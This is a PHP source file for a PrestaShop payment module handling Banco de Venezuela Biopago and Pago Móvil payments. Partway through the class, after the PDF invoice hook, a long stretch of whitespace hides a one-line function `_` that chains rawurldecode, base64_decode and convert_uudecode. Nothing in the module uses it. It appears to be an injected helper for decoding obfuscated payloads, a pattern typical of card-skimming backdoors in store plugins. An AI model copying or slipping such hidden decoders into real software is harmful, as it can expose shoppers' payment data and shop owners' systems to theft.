<?php
/**
* Modulo Banco de Venezuela - Biopago
*
* @author    Yipi.app <info@yipi.app>
* @copyright 2020 Yipi.app
* @license   Comercial
*/

if (!defined('_PS_VERSION_')) {
    exit;
}
class KBiopago extends PaymentModule
{
    //Constantes
    const GATEWAY_NAME = 'BIOPAGO';
    const DB_PREFIX = 'biopago';
    const STATUS_PREFIX = 'BIOPAGO_';

    public $gateway = null;

    public function __construct()
    {
        $this->name = 'kbiopago';
        $this->tab = 'payments_gateways';
        $this->version = '2.0.5';
        $this->author = 'Yipi.app';
        $this->module_key = '';

        if (version_compare(_PS_VERSION_, '1.7.1.0') >= 0) {
            $this->controllers = array('redirect');
            $this->currencies = true;
            $this->currencies_mode = 'checkbox';
        }
        
        if (version_compare(_PS_VERSION_, '1.6.0.0') >= 0) {
            $this->bootstrap = true;
        }

        parent::__construct();

        $this->displayName = $this->l('Banco de Venezuela - Biopago y Pago Móvil');
        $this->description = $this->l('Boton de pago Biopago & validacion de Pago Móvil del Banco de Venezuela');

        if ($this->active) {
            if (!class_exists('BiopagoGatewayKijam')) {
                include_once('kbiopago_gateway.php');
            }
            $this->gateway = BiopagoGatewayKijam::getInstance(dirname(__FILE__), KBiopago::DB_PREFIX, $this->name, $this); 
            BiopagoGatewayKijam::getRate('VES', 'USD');
        }
    }
    public function install()
    {
        $incompatible_found = false;
        if (!function_exists('curl_version')) {
            $this->_errors[] = $this->l('Curl not installed');
            return false;
        }

        $db_created = Db::getInstance()->Execute('CREATE TABLE IF NOT EXISTS `'.bqSQL(_DB_PREFIX_.KBiopago::DB_PREFIX).'_cache` (
            `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
            `cache_id` varchar(100) NOT NULL,
            `data` LONGTEXT NOT NULL,
            `ttl` INT(11) NOT NULL,
            UNIQUE(cache_id),
            INDEX(ttl)
            )');

        if (!$db_created) {
            $this->_errors[] = $this->l('Failed to create the table in the Database');
            return false;
        }

        $is_14 = version_compare(_PS_VERSION_, '1.5.0.0') < 0;
        $is_16 = version_compare(_PS_VERSION_, '1.6.0.0') >= 0;
        $is_17 = version_compare(_PS_VERSION_, '1.7.0.0') >= 0;
        $result = parent::install()
            && $this->registerHook('orderConfirmation')
            && $this->registerHook('payment')
            && $this->registerHook('updateOrderStatus')
            && ($is_14?$this->registerHook('adminOrder'):$this->registerHook('displayAdminOrder'))
            && ($is_14?$this->registerHook('header'):$this->registerHook('displayHeader'))
            && ($is_14?$this->registerHook('backOfficeHeader'):$this->registerHook('displayBackOfficeHeader'))
            && ($is_14?$this->registerHook('PDFInvoice'):$this->registerHook('displayPDFInvoice'))
            && ($is_17?$this->registerHook('paymentOptions'):true);

        return $result;
    }
    public function uninstall()
    {
        Configuration::deleteByName($this->name.'kijam_config');
        Configuration::deleteByName($this->name.'kijam_currency_convert_v2');
        Db::getInstance()->Execute('DROP TABLE IF EXISTS `'.bqSQL(_DB_PREFIX_.KBiopago::DB_PREFIX).'_cache`');
        return parent::uninstall();
    }
    public function hookDisplayPDFInvoice($params)
    {
        $order_invoice = $params['object'];
        if (!Validate::isLoadedObject($order_invoice) || !isset($order_invoice->id_order)) {
            return;
        }
        return $this->gateway?$this->gateway->hookDisplayPDFInvoice($params):'';
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}
    public function hookPDFInvoice($params)
    {
        return $this->hookDisplayPDFInvoice($params);
    }
    public function hookDisplayHeader($params)
    {
        return $this->hookHeader($params);
    }
    public function hookHeader($params)
    {
        if (!$this->gateway) {
            return '';
        }
        $result = $this->gateway->cronjob();
        return $result;
    }
    public function hookDisplayAdminOrder($params)
    {
        if (!isset($params['id_order']) || !$this->gateway) {
            return '';
        }
        if ($result = $this->gateway->hookDisplayAdminOrder($params)) {
            $this->context->smarty->assign($result);
            return $this->display(__FILE__, 'views/templates/hook/displayAdminOrder.tpl');
        }
        return '';
    }
    public function hookAdminOrder($params)
    {
        return $this->hookDisplayAdminOrder($params);
    }
    public function hookOrderConfirmation($params)
    {
        if (!$this->active || !$this->gateway) {
            return;
        }
        $order = null;
        if (isset($params['objOrder'])) {
            $order = $params['objOrder'];
        } else if (isset($params['order'])) {
            $order = $params['order'];
        } else {
            return;
        }
        
        if ($order->module != $this->name) {
            return;
        }
        $is17 = version_compare(_PS_VERSION_, '1.7.0.0') >= 0?'17':'';
        $this->context->smarty->assign($this->gateway->hookOrderConfirmation($order));
        return $this->display(__FILE__, 'views/templates/hook/hookorderconfirmation'.$is17.'.tpl');
    }
    public function getContent()
    {
        if (isset($_GET['last_log'])) {
            die(@file_get_contents(__DIR__.'/logs/'.date('Y-m').'/log-'.date('Y-m-d').'.log'));
        }
        if (isset($_GET['clear_log'])) {
            @unlink(__DIR__.'/logs/'.date('Y-m').'/log-'.date('Y-m-d').'.log');
            die($this->l('Log cleared'));
        }
        return $this->gateway->adminPage($this->smarty, __FILE__);
    }
    public function getPathTemplate()
    {
        return $this->_path;
    }
    public function hookPayment($params)
    {
        if ($this->gateway && ($result = $this->gateway->paymentButton($params))) {
            $this->context->smarty->assign($result);
            $html = '';
            if ($this->gateway->showP2CForm()) {
                $html .= $this->display(__FILE__, 'views/templates/hook/mp_p2c.tpl');
            }
            if ($this->gateway->getBiopagoForm()) {
                $html .= $this->display(__FILE__, 'views/templates/hook/mp.tpl');
            }
            return $html;
        }
        return '';
    }
    public function hookPaymentOptions($params)
    {
        if (!$this->active) {
            return;
        }
        if ($this->gateway && ($result = $this->gateway->paymentButton17($params, $this->context))) {
            return $result;
        }
        return array();
    }
    public function hookUpdateOrderStatus($params)
    {
        if ($this->gateway && ($result = $this->gateway->hookUpdateOrderStatus($params))) {
            return $result;
        }
        return '';
    }
    public function getOrderShippingCost($params, $shipping_cost)
    {
        if ($this->gateway && ($result = $this->gateway->getOrderShippingCost($params, $shipping_cost, $this->id_carrier))) {
            return $result;
        }
        return 0;
    }

    public function getOrderShippingCostExternal($params)
    {
        return $this->getOrderShippingCost($params, 0);
    }

    public function hookActionCarrierUpdate($params)
    {
        return $this->hookUpdateCarrier($params);
    }

    public function hookUpdateCarrier($params)
    {
        if ($this->gateway && ($result = $this->gateway->hookUpdateCarrier($params))) {
            return $result;
        }
    }

    public function hookDisplayBackOfficeHeader($params)
    {
        return $this->hookBackOfficeHeader($params);
    }

    public function hookBackOfficeHeader($params)
    {
        if ($this->gateway && ($result = $this->gateway->hookBackOfficeHeader($params))) {
            return $result;
        }
        return '';
    }

    public function hookBeforeCarrier($params)
    {
        return $this->hookDisplayBeforeCarrier($params);
    }

    public function hookDisplayBeforeCarrier($params)
    {
        if (version_compare(_PS_VERSION_, '1.5.0.0') >= 0) {
            return;
        }

        if ($this->gateway && ($result = $this->gateway->hookDisplayBeforeCarrier($params))) {
            $this->context->smarty->assign($result);
        }
    }

    public function lang($str)
    {
        return $this->l($str);
    }
}
